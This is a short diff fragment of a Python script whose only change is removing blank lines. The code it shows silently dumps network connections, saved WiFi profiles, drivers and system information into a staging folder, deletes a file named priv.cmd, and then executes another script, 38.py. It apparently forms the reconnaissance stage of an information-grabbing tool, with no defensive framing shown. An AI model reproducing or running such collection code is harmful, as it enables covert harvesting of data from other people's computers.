@@ -74,22 +74,13 @@ ipaddr()
 
 file1 = "WiFi-List.txt"
 fields1 = "Files\WiFi-List.txt"
-
 os.system("netstat -n > Files\ActiveConnections.txt")
-
 os.system("Netsh WLAN show profiles > WiFi-List.txt")
-
 os.remove("priv.cmd")
-
 os.system("DRIVERQUERY > Files\driverquery.txt")
-
 shutil.move(file1, fields1)
-
 sys_file = "ExtraSystemInfo.txt"
 sys_dir = "Files\ExtraSystemInfo.txt"
-
 os.system("systeminfo > ExtraSystemInfo.txt")
-
 shutil.move(sys_file, sys_dir)
-
 exec(open("38.py").read())
